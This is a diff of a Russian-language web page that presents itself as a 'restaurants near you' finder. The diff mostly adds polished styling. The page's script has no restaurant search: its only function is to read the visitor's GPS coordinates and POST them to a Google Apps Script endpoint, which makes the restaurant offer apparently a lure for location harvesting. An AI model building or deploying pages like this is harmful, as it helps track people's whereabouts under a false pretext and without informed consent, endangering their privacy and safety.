@@ -1,35 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <meta charset="utf-8" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Рестораны рядом</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(145deg, #f2f3f5, #dfe1e5);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: #fff;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      animation: fadeIn 0.6s ease;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #1c1c1e;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      background: #007aff;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #005ecb;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
 <body>
-  <h2>Рестораны рядом с тобой</h2>
-  <button onclick="sendLocation()">Разрешить геолокацию</button>
+  <div class="container">
+    <h1>Найти рестораны рядом</h1>
+    <button onclick="sendLocation()">Разрешить геолокацию</button>
+  </div>
 
   <script>
     function sendLocation() {
       if (!navigator.geolocation) {
-        alert("Геолокация не поддерживается.");
+        alert("Геолокация не поддерживается этим браузером");
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(position => {
-        const data = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude
-        };
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude
+          };
 
-        fetch("https://script.google.com/macros/s/AKfycbxRbTX1EL4np3ivsSYxqMEuL5APlquvFsvhTFdM-a_n8tnWcSxF3jB7Ff7-oLeXuQvT/exec", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        })
-        .then(res => res.text())
-        .then(() => alert("Координаты отправлены!"))
-        .catch(err => alert("Ошибка: " + err.message));
-      }, err => alert("Ошибка геолокации: " + err.message));
+          fetch("https://script.google.com/macros/s/AKfycbxRbTX1EL4np3ivsSYxqMEuL5APlquvFsvhTFdM-a_n8tnWcSxF3jB7Ff7-oLeXuQvT/exec", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+          })
+          .then(res => res.text())
+          .then(() => alert("Координаты отправлены!"))
+          .catch(err => alert("Ошибка: " + err.message));
+        },
+        err => alert("Ошибка получения геолокации: " + err.message)
+      );
     }
   </script>
 </body>
